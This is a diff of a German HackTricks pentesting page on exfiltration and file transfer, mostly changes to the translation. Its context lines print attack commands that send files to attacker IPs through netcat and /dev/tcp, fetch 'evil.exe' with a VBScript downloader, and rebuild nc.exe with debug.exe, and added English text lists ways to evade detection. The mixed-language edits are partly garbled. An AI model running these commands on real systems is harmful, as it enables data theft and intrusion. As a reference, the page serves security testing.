@@ -10,13 +10,13 @@ Andere Möglichkeiten, HackTricks zu unterstützen:
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys senden.
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
 
 </details>
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -65,7 +65,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Dateien hochladen
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**SimpleHttpServer, das GET- und POST-Anforderungen (auch Header) druckt**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Python-Modul [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -185,41 +185,17 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-# Exfiltration
+### Exfiltration
 
-## Introduction
+Exfiltration techniques are used to steal data from a target network. Once an attacker gains access to a system, they need to find a way to get the data out without being detected. There are several methods to exfiltrate data, including:
 
-Exfiltration is the unauthorized transfer of data from a target system. This can be achieved through various methods, such as:
+- **Compression**: Compressing data before exfiltration can help evade detection.
+- **Encryption**: Encrypting the data makes it harder for security tools to detect.
+- **Steganography**: Hiding data within other files or images can be a stealthy way to exfiltrate information.
+- **DNS Tunneling**: Using DNS requests to send data out of a network can bypass some security controls.
+- **Exfiltration over Alternative Protocols**: Using protocols like ICMP or HTTP to exfiltrate data can also help avoid detection.
 
-- Uploading data to an external server
-- Sending data via email
-- Using covert channels
-
-## Techniques
-
-### Data Compression
-
-Data can be compressed before exfiltration to reduce its size and avoid detection.
-
-### Data Encryption
-
-Encrypting data before exfiltration can prevent unauthorized access to the stolen information.
-
-### Steganography
-
-Hiding data within other files or images can help evade detection during exfiltration.
-
-## Tools
-
-There are various tools available for exfiltrating data from a target system, such as:
-
-- **Netcat**: A versatile networking utility that can be used for transferring data.
-- **Wget**: A command-line utility for downloading files from the web.
-- **Curl**: Another command-line tool for transferring data with support for various protocols.
-
-## Conclusion
-
-Exfiltration is a critical phase of a successful attack, and understanding the various techniques and tools available is essential for a hacker.
+Attackers may also use tools like **PowerShell** or **WMI** for exfiltration, as these are built-in to Windows and may not be detected by security tools.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -253,9 +229,11 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Datei auf Opfer hochladen
+### Datei auf das Opfer hochladen
 
-Wenn Sie Zugriff auf das Opfersystem haben, können Sie Dateien auf das System hochladen, um Daten zu exfiltrieren. Dies kann über verschiedene Methoden wie Remote-Verwaltungstools, Dateifreigabe oder sogar über E-Mail-Anhänge erfolgen. Stellen Sie sicher, dass Sie die erforderlichen Berechtigungen haben und dass die Dateiübertragung nicht entdeckt wird.
+Upload a file to the victim's machine. 
+
+Laden Sie eine Datei auf den Computer des Opfers hoch.
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -304,7 +282,7 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-Auf dem **Opfer** verbinden Sie sich mit dem Kali-Server:
+In **Opfer**, verbinden Sie sich mit dem Kali-Server:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
@@ -316,7 +294,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-VBScript ist eine von Microsoft entwickelte Skriptsprache, die in Windows-Umgebungen häufig verwendet wird. Es kann verwendet werden, um Dateien zu exfiltrieren, indem es sie in Base64 kodiert und dann in einer HTTP-Anfrage an einen Remote-Server sendet.
+Visual Basic Script (VBScript) ist eine von Microsoft entwickelte Skriptsprache, die in Windows-Umgebungen häufig verwendet wird. VBScript kann verwendet werden, um Windows-spezifische Aufgaben auszuführen und kann auch für bösartige Zwecke wie Datenexfiltration eingesetzt werden.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -354,19 +332,24 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Das Programm `debug.exe` ermöglicht nicht nur die Inspektion von Binärdateien, sondern hat auch die **Fähigkeit, sie aus Hexadezimalwerten neu zu erstellen**. Das bedeutet, dass `debug.exe` anhand eines Hexadezimalwerts einer Binärdatei die Binärdatei generieren kann. Es ist jedoch wichtig zu beachten, dass debug.exe eine **Einschränkung beim Zusammenstellen von Dateien bis zu 64 KB Größe** hat.
+Das Programm `debug.exe` ermöglicht nicht nur die Inspektion von Binärdateien, sondern hat auch die **Fähigkeit, sie aus Hexadezimalwerten neu zu erstellen**. Das bedeutet, dass `debug.exe`, indem es einen Hexadezimalwert einer Binärdatei bereitstellt, die Binärdatei generieren kann. Es ist jedoch wichtig zu beachten, dass debug.exe eine **Einschränkung beim Zusammenstellen von Dateien bis zu 64 KB Größe** hat.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
+```markdown
+Dann kopieren Sie den Text in die Windows-Shell, und eine Datei namens nc.exe wird erstellt.
+
+* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -376,10 +359,11 @@ wine exe2bat.exe nc.exe nc.txt
 
 Andere Möglichkeiten, HackTricks zu unterstützen:
 
-* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
+* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks in PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.
 
 </details>
+```
